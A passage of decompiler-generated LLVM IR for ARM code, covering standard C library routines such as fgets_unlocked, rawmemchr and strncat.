  br i1 %v2_e2dc, label %dec_label_pc_e2dc.dec_label_pc_e2e4_crit_edge, label %dec_label_pc_e230

dec_label_pc_e2dc.dec_label_pc_e2e4_crit_edge:    ; preds = %.thread11
  %v0_e2e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e2e4

dec_label_pc_e2e4:                                ; preds = %dec_label_pc_e2dc.dec_label_pc_e2e4_crit_edge, %dec_label_pc_e1a0
  %v0_e2e4 = phi i32 [ %v0_e2e4.pre, %dec_label_pc_e2dc.dec_label_pc_e2e4_crit_edge ], [ %v1_e220, %dec_label_pc_e1a0 ]
  %v1_e2e4 = call i32 @_stdio_openlist_dec_use(i32 %v0_e2e4)
  store i32 %v1_e2e4, i32* %r0.global-to-local, align 4
  %v0_e328.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e194
  %v1_e2ec = inttoptr i32 %.v1_e180 to i8*
  %v2_e2ec = load i8, i8* %v1_e2ec, align 1
  %v3_e2ec = zext i8 %v2_e2ec to i32
  %v1_e2f0 = and i32 %v3_e2ec, 64
  store i32 %v1_e2f0, i32* %r3.global-to-local, align 4
  %v2_e2f0 = icmp eq i32 %v1_e2f0, 0
  store i1 %v2_e2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e2f0, label %bb41, label %dec_label_pc_e2fc

bb41:                                             ; preds = %dec_label_pc_e2ec
  br label %bb43

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2ec
  %v0_e2fc = call i32 @__stdio_wcommit()
  store i32 %v0_e2fc, i32* %r0.global-to-local, align 4
  %v2_e300 = icmp eq i32 %v0_e2fc, 0
  store i1 %v2_e300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e300, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_e2fc
  %v1_e304 = load i32, i32* %r8.global-to-local, align 4
  %v2_e304 = inttoptr i32 %v1_e304 to i32*
  %v3_e304 = load i32, i32* %v2_e304, align 4
  store i32 %v3_e304, i32* %r3.global-to-local, align 4
  %v2_e308 = add i32 %v1_e304, 8
  %v3_e308 = inttoptr i32 %v2_e308 to i32*
  %v4_e308 = load i32, i32* %v3_e308, align 4
  store i32 %v4_e308, i32* %r1.global-to-local, align 4
  %v2_e30c = and i32 %v3_e304, -65
  store i32 %v2_e30c, i32* %r3.global-to-local, align 4
  %v4_e310 = sdiv i32 %v3_e304, 256
  %v2_e314 = trunc i32 %v4_e310 to i8
  %v4_e314 = add i32 %v1_e304, 1
  %v5_e314 = inttoptr i32 %v4_e314 to i8*
  store i8 %v2_e314, i8* %v5_e314, align 1
  %v0_e318.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e318.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_e318 = load i32, i32* %r1.global-to-local, align 4
  %v2_e318 = load i32, i32* %r8.global-to-local, align 4
  %v3_e318 = add i32 %v2_e318, 28
  %v4_e318 = inttoptr i32 %v3_e318 to i32*
  store i32 %v1_e318, i32* %v4_e318, align 4
  %v1_e31c = load i32, i32* %r3.global-to-local, align 4
  %v2_e31c = trunc i32 %v1_e31c to i8
  %v3_e31c = load i32, i32* %r8.global-to-local, align 4
  %v4_e31c = inttoptr i32 %v3_e31c to i8*
  store i8 %v2_e31c, i8* %v4_e31c, align 1
  %v0_e320.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e320.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_e2fc
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_e2e4, %.thread20
  %v0_e328 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_e328.pre, %dec_label_pc_e2e4 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_e328, i32* %r0.global-to-local, align 4
  store i32 %v3_e174, i32* @r4, align 4
  ret i32 %v0_e328

; uselistorder directives
  uselistorder i32 %v0_e328, { 1, 0 }
  uselistorder i32 %v3_e2d8, { 1, 2, 0 }
  uselistorder i32 %v2_e188, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 6, 5, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32 (i32)* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1b740.295 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_1baf0.275, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e278, { 1, 0 }
  uselistorder label %dec_label_pc_e230, { 1, 0 }
  uselistorder label %dec_label_pc_e1a0, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e35c = icmp eq i32 %arg2, 0
  store i1 %v2_e35c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_e3e4, label %dec_label_pc_e3c8.preheader

dec_label_pc_e3c8.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_e3c815 = add i32 %arg2, -1
  store i32 %v1_e3c815, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_e3c821 = icmp eq i32 %arg2, 1
  store i1 %v7_e3c821, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e3c821, label %dec_label_pc_e3d4, label %dec_label_pc_e374

dec_label_pc_e374:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e3c8.backedge
  %v1_e3cc24.in = phi i32 [ %v0_e3cc.pre, %dec_label_pc_e3c8.backedge ], [ %arg3, %dec_label_pc_e3c8.preheader ]
  %v1_e374 = add i32 %v1_e3cc24.in, 16
  %v2_e374 = inttoptr i32 %v1_e374 to i32*
  %v3_e374 = load i32, i32* %v2_e374, align 4
  store i32 %v3_e374, i32* %r2.global-to-local, align 4
  %v1_e378 = add i32 %v1_e3cc24.in, 24
  %v2_e378 = inttoptr i32 %v1_e378 to i32*
  %v3_e378 = load i32, i32* %v2_e378, align 4
  %v3_e37c = icmp uge i32 %v3_e374, %v3_e378
  store i1 %v3_e37c, i1* %cpsr_c.global-to-local, align 1
  %v9_e37c = icmp eq i32 %v3_e374, %v3_e378
  store i1 %v9_e37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e37c, label %dec_label_pc_e39c, label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %dec_label_pc_e374
  %v1_e384 = inttoptr i32 %v3_e374 to i8*
  %v2_e384 = load i8, i8* %v1_e384, align 1
  %v5_e384 = add i32 %v3_e374, 1
  store i32 %v5_e384, i32* %r2.global-to-local, align 4
  %v2_e388 = load i32, i32* @r4, align 4
  %v3_e388 = inttoptr i32 %v2_e388 to i8*
  store i8 %v2_e384, i8* %v3_e388, align 1
  %v0_e38c = load i32, i32* @r4, align 4
  %v1_e38c = inttoptr i32 %v0_e38c to i8*
  %v2_e38c = load i8, i8* %v1_e38c, align 1
  %v5_e38c = add i32 %v0_e38c, 1
  store i32 %v5_e38c, i32* @r4, align 4
  %v2_e390 = icmp ugt i8 %v2_e38c, 9
  store i1 %v2_e390, i1* %cpsr_c.global-to-local, align 1
  %v7_e390 = icmp eq i8 %v2_e38c, 10
  store i1 %v7_e390, i1* %cpsr_z.global-to-local, align 1
  %v0_e394 = load i32, i32* %r2.global-to-local, align 4
  %v1_e394 = load i32, i32* @r5, align 4
  %v2_e394 = add i32 %v1_e394, 16
  %v3_e394 = inttoptr i32 %v2_e394 to i32*
  store i32 %v0_e394, i32* %v3_e394, align 4
  br i1 %v7_e390, label %dec_label_pc_e3d4, label %dec_label_pc_e3c8.backedge

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e374
  %v1_e3cc24 = inttoptr i32 %v1_e3cc24.in to i8*
  %v3_e39c = call i32 @getc_unlocked(i8* %v1_e3cc24)
  %v4_e39c = trunc i32 %v3_e39c to i8
  %v5_e3a0 = icmp eq i8 %v4_e39c, -1
  store i1 %v5_e3a0, i1* %cpsr_c.global-to-local, align 1
  %v10_e3a0 = icmp eq i32 %v3_e39c, -1
  store i1 %v10_e3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_e3a0, label %dec_label_pc_e3a8, label %dec_label_pc_e3c4

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e39c
  %v0_e3a8 = load i32, i32* @r5, align 4
  %v1_e3a8 = inttoptr i32 %v0_e3a8 to i8*
  %v2_e3a8 = load i8, i8* %v1_e3a8, align 1
  %v1_e3ac = and i8 %v2_e3a8, 8
  %v2_e3ac = icmp eq i8 %v1_e3ac, 0
  store i1 %v2_e3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3ac, label %dec_label_pc_e3d4, label %dec_label_pc_e3e4

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_e39c
  %v3_e3b8 = load i32, i32* @r4, align 4
  %v4_e3b8 = inttoptr i32 %v3_e3b8 to i8*
  store i8 %v4_e39c, i8* %v4_e3b8, align 1
  %v0_e3bc = load i32, i32* @r4, align 4
  %v1_e3bc = inttoptr i32 %v0_e3bc to i8*
  %v2_e3bc = load i8, i8* %v1_e3bc, align 1
  %v5_e3bc = add i32 %v0_e3bc, 1
  store i32 %v5_e3bc, i32* @r4, align 4
  %v2_e3c0 = icmp ugt i8 %v2_e3bc, 9
  store i1 %v2_e3c0, i1* %cpsr_c.global-to-local, align 1
  %v7_e3c0 = icmp eq i8 %v2_e3bc, 10
  store i1 %v7_e3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e3c0, label %dec_label_pc_e3d4, label %dec_label_pc_e3c8.backedge

dec_label_pc_e3c8.backedge:                       ; preds = %dec_label_pc_e3c4, %dec_label_pc_e384
  %v0_e3c8.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_e3cc.pre = load i32, i32* @r5, align 4
  %v1_e3c8 = add i32 %v0_e3c8.pre, -1
  store i32 %v1_e3c8, i32* %r6.global-to-local, align 4
  %v2_e3c8 = icmp ne i32 %v0_e3c8.pre, 0
  store i1 %v2_e3c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e3c8 = icmp eq i32 %v0_e3c8.pre, 1
  store i1 %v7_e3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e3c8, label %dec_label_pc_e3d4, label %dec_label_pc_e374

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e3c4, %dec_label_pc_e3c8.backedge, %dec_label_pc_e384, %dec_label_pc_e3a8
  %v0_e3d4 = load i32, i32* @r4, align 4
  %v1_e3d4 = load i32, i32* %r7.global-to-local, align 4
  %v3_e3d4 = icmp uge i32 %v0_e3d4, %v1_e3d4
  store i1 %v3_e3d4, i1* %cpsr_c.global-to-local, align 1
  %v9_e3d4 = icmp eq i32 %v0_e3d4, %v1_e3d4
  store i1 %v9_e3d4, i1* %cpsr_z.global-to-local, align 1
  %v2_e3d8 = xor i1 %v9_e3d4, true
  %v3_e3d8 = and i1 %v3_e3d4, %v2_e3d8
  br i1 %v3_e3d8, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_e3d4
  %v7_e3dc = inttoptr i32 %v0_e3d4 to i8*
  store i8 0, i8* %v7_e3dc, align 1
  %v0_e3e0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_e3e0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e3d4, %bb
  %v1_e3e0 = phi i1 [ %v1_e3e0.pre, %bb ], [ %v9_e3d4, %dec_label_pc_e3d4 ]
  %v0_e3e0 = phi i1 [ %v0_e3e0.pre, %bb ], [ %v3_e3d4, %dec_label_pc_e3d4 ]
  %v2_e3e0 = xor i1 %v1_e3e0, true
  %v3_e3e0 = and i1 %v0_e3e0, %v2_e3e0
  br i1 %v3_e3e0, label %.dec_label_pc_e3e8_crit_edge, label %dec_label_pc_e3e4

.dec_label_pc_e3e8_crit_edge:                     ; preds = %.thread7
  %v0_e3e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e3e8

dec_label_pc_e3e4:                                ; preds = %entry, %dec_label_pc_e3a8, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e3e8

dec_label_pc_e3e8:                                ; preds = %.dec_label_pc_e3e8_crit_edge, %dec_label_pc_e3e4
  %v0_e3e8 = phi i32 [ %v0_e3e8.pre, %.dec_label_pc_e3e8_crit_edge ], [ 0, %dec_label_pc_e3e4 ]
  ret i32 %v0_e3e8

; uselistorder directives
  uselistorder i1 %v9_e3d4, { 1, 0, 2 }
  uselistorder i32 %v1_e3d4, { 1, 0 }
  uselistorder i32 %v0_e3d4, { 0, 2, 1 }
  uselistorder i32 %v0_e3c8.pre, { 2, 0, 1 }
  uselistorder i1 %v2_e3ac, { 1, 0 }
  uselistorder i32 %v3_e374, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e3cc24.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_e3e8, { 1, 0 }
  uselistorder label %dec_label_pc_e3e4, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_e3d4, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_e374, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e414:
  %v1_e3f4 = urem i32 %arg1, 256
  store i32 %v1_e3f4, i32* @lr, align 4
  %v4_e414 = mul nuw nsw i32 %v1_e3f4, 256
  %v5_e414 = or i32 %v4_e414, %v1_e3f4
  %v4_e41c = mul i32 %v5_e414, 65536
  %v5_e41c = or i32 %v4_e41c, %v5_e414
  %v0_e420.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_e420

dec_label_pc_e420:                                ; preds = %dec_label_pc_e48c, %dec_label_pc_e420, %dec_label_pc_e414
  %v0_e420 = phi i32 [ %v0_e420.pre, %dec_label_pc_e414 ], [ %v4_e420, %dec_label_pc_e420 ], [ %v4_e420, %dec_label_pc_e48c ]
  %v1_e420 = inttoptr i32 %v0_e420 to i32*
  %v2_e420 = load i32, i32* %v1_e420, align 4
  %v4_e420 = add i32 %v0_e420, 4
  store i32 %v4_e420, i32* @ip, align 4
  %v2_e428 = xor i32 %v2_e420, %v5_e41c
  %v2_e42c = add i32 %v2_e428, 2130640639
  %v1_e434 = sub i32 -1, %v2_e428
  %v2_e438 = xor i32 %v2_e42c, %v1_e434
  %v2_e43c = and i32 %v2_e438, -2130640640
  %v2_e440 = icmp eq i32 %v2_e43c, 0
  br i1 %v2_e440, label %dec_label_pc_e420, label %dec_label_pc_e448

dec_label_pc_e448:                                ; preds = %dec_label_pc_e420
  %v2_e448 = inttoptr i32 %v0_e420 to i8*
  %v3_e448 = load i8, i8* %v2_e448, align 1
  %v4_e448 = zext i8 %v3_e448 to i32
  %v9_e450 = icmp eq i32 %v4_e448, %v1_e3f4
  store i1 %v9_e450, i1* @cpsr_z, align 1
  %v1_e454 = add i32 %v0_e420, 3
  %v1_e458 = add i32 %v0_e420, 1
  %v1_e45c = add i32 %v0_e420, 2
  br i1 %v9_e450, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_e448
  ret i32 %v0_e420

bb18:                                             ; preds = %dec_label_pc_e448
  %v2_e464 = inttoptr i32 %v1_e458 to i8*
  %v3_e464 = load i8, i8* %v2_e464, align 1
  %v4_e464 = zext i8 %v3_e464 to i32
  %v9_e468 = icmp eq i32 %v4_e464, %v1_e3f4
  store i1 %v9_e468, i1* @cpsr_z, align 1
  br i1 %v9_e468, label %dec_label_pc_e470, label %dec_label_pc_e478

dec_label_pc_e470:                                ; preds = %bb18
  ret i32 %v1_e458

dec_label_pc_e478:                                ; preds = %bb18
  %v2_e478 = inttoptr i32 %v1_e45c to i8*
  %v3_e478 = load i8, i8* %v2_e478, align 1
  %v4_e478 = zext i8 %v3_e478 to i32
  %v9_e47c = icmp eq i32 %v4_e478, %v1_e3f4
  store i1 %v9_e47c, i1* @cpsr_z, align 1
  br i1 %v9_e47c, label %dec_label_pc_e484, label %dec_label_pc_e48c

dec_label_pc_e484:                                ; preds = %dec_label_pc_e478
  ret i32 %v1_e45c

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e478
  %v2_e48c = inttoptr i32 %v1_e454 to i8*
  %v3_e48c = load i8, i8* %v2_e48c, align 1
  %v4_e48c = zext i8 %v3_e48c to i32
  %v9_e490 = icmp eq i32 %v4_e48c, %v1_e3f4
  store i1 %v9_e490, i1* @cpsr_z, align 1
  br i1 %v9_e490, label %dec_label_pc_e498, label %dec_label_pc_e420

dec_label_pc_e498:                                ; preds = %dec_label_pc_e48c
  ret i32 %v1_e454

; uselistorder directives
  uselistorder i32 %v4_e420, { 2, 1, 0 }
  uselistorder i32 %v0_e420, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_e414, { 1, 0 }
  uselistorder i32 %v1_e3f4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 2, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 4, 21, 22, 0, 5, 6, 7 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e4a8 = load i32, i32* @r4, align 4
  store i32 %v3_e4a8, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e4b4, %entry
  %v0_e4b4 = phi i32 [ %v5_e4b4, %dec_label_pc_e4b4 ], [ %tmp, %entry ]
  %v1_e4b4 = inttoptr i32 %v0_e4b4 to i8*
  %v2_e4b4 = load i8, i8* %v1_e4b4, align 1
  %v3_e4b4 = zext i8 %v2_e4b4 to i32
  store i32 %v3_e4b4, i32* %ip.global-to-local, align 4
  %v5_e4b4 = add i32 %v0_e4b4, 1
  store i32 %v5_e4b4, i32* %r3.global-to-local, align 4
  %v2_e4b8 = icmp eq i8 %v2_e4b4, 0
  store i1 %v2_e4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4b8, label %dec_label_pc_e4c0, label %dec_label_pc_e4b4

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e4b4
  %v0_e4c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_e4c0 = icmp eq i32 %v0_e4c0, 3
  store i1 %v7_e4c0, i1* %cpsr_z.global-to-local, align 1
  %v1_e4c4 = add i32 %v0_e4b4, -1
  store i32 %v1_e4c4, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_e4c0, 4
  br i1 %tmp10, label %dec_label_pc_e558thread-pre-split, label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4c0
  %v3_e4cc = udiv i32 %v0_e4c0, 4
  store i32 %v3_e4cc, i32* %r0.global-to-local, align 4
  %v0_e4d0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4d0

dec_label_pc_e4d0:                                ; preds = %dec_label_pc_e530, %dec_label_pc_e4cc
  %v2_e4d8 = phi i32 [ %v1_e528, %dec_label_pc_e530 ], [ %v1_e4c4, %dec_label_pc_e4cc ]
  %v0_e4d0 = phi i32 [ %v1_e524, %dec_label_pc_e530 ], [ %v0_e4d0.pre, %dec_label_pc_e4cc ]
  %v1_e4d0 = inttoptr i32 %v0_e4d0 to i8*
  %v2_e4d0 = load i8, i8* %v1_e4d0, align 1
  %v3_e4d0 = zext i8 %v2_e4d0 to i32
  store i32 %v3_e4d0, i32* %r3.global-to-local, align 4
  %v2_e4d4 = icmp eq i8 %v2_e4d0, 0
  store i1 %v2_e4d4, i1* %cpsr_z.global-to-local, align 1
  %v3_e4d8 = add i32 %v2_e4d8, 1
  %v4_e4d8 = inttoptr i32 %v3_e4d8 to i8*
  store i8 %v2_e4d0, i8* %v4_e4d8, align 1
  %v0_e4dc = load i32, i32* %lr.global-to-local, align 4
  %v1_e4dc = add i32 %v0_e4dc, 1
  store i32 %v1_e4dc, i32* %ip.global-to-local, align 4
  %v0_e4e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e4e0, label %.loopexit, label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4d0
  %v0_e4e4 = load i32, i32* @r1, align 4
  %v1_e4e4 = add i32 %v0_e4e4, 1
  %v2_e4e4 = inttoptr i32 %v1_e4e4 to i8*
  %v3_e4e4 = load i8, i8* %v2_e4e4, align 1
  %v4_e4e4 = zext i8 %v3_e4e4 to i32
  store i32 %v4_e4e4, i32* %r3.global-to-local, align 4
  %v2_e4e8 = icmp eq i8 %v3_e4e4, 0
  store i1 %v2_e4e8, i1* %cpsr_z.global-to-local, align 1
  %v3_e4ec = add i32 %v0_e4dc, 2
  %v4_e4ec = inttoptr i32 %v3_e4ec to i8*
  store i8 %v3_e4e4, i8* %v4_e4ec, align 1
  %v0_e4f0 = load i32, i32* @r1, align 4
  %v1_e4f0 = add i32 %v0_e4f0, 1
  store i32 %v1_e4f0, i32* %r1.global-to-local, align 4
  %v0_e4f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e4f4 = add i32 %v0_e4f4, 1
  store i32 %v1_e4f4, i32* %ip.global-to-local, align 4
  %v0_e4f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e4f8, label %.loopexit, label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4e4
  %v1_e4fc = add i32 %v0_e4f0, 2
  %v2_e4fc = inttoptr i32 %v1_e4fc to i8*
  %v3_e4fc = load i8, i8* %v2_e4fc, align 1
  %v4_e4fc = zext i8 %v3_e4fc to i32
  store i32 %v4_e4fc, i32* %r3.global-to-local, align 4
  %v2_e500 = icmp eq i8 %v3_e4fc, 0
  store i1 %v2_e500, i1* %cpsr_z.global-to-local, align 1
  %v3_e504 = add i32 %v0_e4f4, 2
  %v4_e504 = inttoptr i32 %v3_e504 to i8*
  store i8 %v3_e4fc, i8* %v4_e504, align 1
  %v0_e508 = load i32, i32* %r1.global-to-local, align 4
  %v1_e508 = add i32 %v0_e508, 1
  store i32 %v1_e508, i32* %r1.global-to-local, align 4
  %v0_e50c = load i32, i32* %ip.global-to-local, align 4
  %v1_e50c = add i32 %v0_e50c, 1
  store i32 %v1_e50c, i32* %lr.global-to-local, align 4
  %v0_e510 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e510, label %.loopexit, label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e4fc
  %v1_e514 = add i32 %v0_e508, 2
  %v2_e514 = inttoptr i32 %v1_e514 to i8*
  %v3_e514 = load i8, i8* %v2_e514, align 1
  %v4_e514 = zext i8 %v3_e514 to i32
  store i32 %v4_e514, i32* %ip.global-to-local, align 4
  store i32 %v1_e514, i32* %r3.global-to-local, align 4
  %v2_e51c = icmp eq i8 %v3_e514, 0
  store i1 %v2_e51c, i1* %cpsr_z.global-to-local, align 1
  %v3_e520 = add i32 %v0_e50c, 2
  %v4_e520 = inttoptr i32 %v3_e520 to i8*
  store i8 %v3_e514, i8* %v4_e520, align 1
  %v0_e524 = load i32, i32* %r3.global-to-local, align 4
  %v1_e524 = add i32 %v0_e524, 1
  store i32 %v1_e524, i32* @r1, align 4
  %v0_e528 = load i32, i32* %lr.global-to-local, align 4
  %v1_e528 = add i32 %v0_e528, 1
  store i32 %v1_e528, i32* %lr.global-to-local, align 4
  %v0_e52c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e52c, label %.loopexit, label %dec_label_pc_e530

dec_label_pc_e530:                                ; preds = %dec_label_pc_e514
  %v0_e530 = load i32, i32* %r0.global-to-local, align 4
  %v1_e530 = add i32 %v0_e530, -1
  store i32 %v1_e530, i32* %r0.global-to-local, align 4
  %v7_e530 = icmp eq i32 %v0_e530, 1
  store i1 %v7_e530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e530, label %dec_label_pc_e538, label %dec_label_pc_e4d0

dec_label_pc_e538:                                ; preds = %dec_label_pc_e530
  %v0_e538 = load i32, i32* %r2.global-to-local, align 4
  %v1_e538 = urem i32 %v0_e538, 4
  store i32 %v1_e538, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e558

dec_label_pc_e540:                                ; preds = %dec_label_pc_e558
  %v0_e540 = load i32, i32* @r1, align 4
  %v1_e540 = inttoptr i32 %v0_e540 to i8*
  %v2_e540 = load i8, i8* %v1_e540, align 1
  %v3_e540 = zext i8 %v2_e540 to i32
  store i32 %v3_e540, i32* %ip.global-to-local, align 4
  %v2_e544 = icmp eq i8 %v2_e540, 0
  store i1 %v2_e544, i1* %cpsr_z.global-to-local, align 1
  %v1_e548 = add i32 %v1_e564, -1
  store i32 %v1_e548, i32* %r2.global-to-local, align 4
  %v3_e54c = add i32 %v3_e564, 1
  %v4_e54c = inttoptr i32 %v3_e54c to i8*
  store i8 %v2_e540, i8* %v4_e54c, align 1
  %v5_e54c = load i32, i32* %lr.global-to-local, align 4
  %v6_e54c = add i32 %v5_e54c, 1
  store i32 %v6_e54c, i32* %lr.global-to-local, align 4
  %v0_e550 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e550, label %.loopexit, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e540
  %v0_e554 = load i32, i32* @r1, align 4
  %v1_e554 = add i32 %v0_e554, 1
  store i32 %v1_e554, i32* @r1, align 4
  %v0_e558.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e558thread-pre-split

dec_label_pc_e558thread-pre-split:                ; preds = %dec_label_pc_e554, %dec_label_pc_e4c0
  %v2_e54c6 = phi i32 [ %v6_e54c, %dec_label_pc_e554 ], [ %v1_e4c4, %dec_label_pc_e4c0 ]
  %v0_e558.pr = phi i32 [ %v0_e558.pr.pre, %dec_label_pc_e554 ], [ %v0_e4c0, %dec_label_pc_e4c0 ]
  br label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e558thread-pre-split, %dec_label_pc_e538
  %v3_e564 = phi i32 [ %v2_e54c6, %dec_label_pc_e558thread-pre-split ], [ %v1_e528, %dec_label_pc_e538 ]
  %v1_e564 = phi i32 [ %v0_e558.pr, %dec_label_pc_e558thread-pre-split ], [ %v1_e538, %dec_label_pc_e538 ]
  %v2_e558 = icmp eq i32 %v1_e564, 0
  store i1 %v2_e558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e558, label %dec_label_pc_e560, label %dec_label_pc_e540

dec_label_pc_e560:                                ; preds = %dec_label_pc_e558
  %v0_e560 = load i32, i32* %ip.global-to-local, align 4
  %v2_e560 = icmp eq i32 %v0_e560, 0
  store i1 %v2_e560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e560, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_e560
  %v4_e564 = add i32 %v3_e564, 1
  %v5_e564 = inttoptr i32 %v4_e564 to i8*
  store i8 0, i8* %v5_e564, align 1
  br label %.loopexit

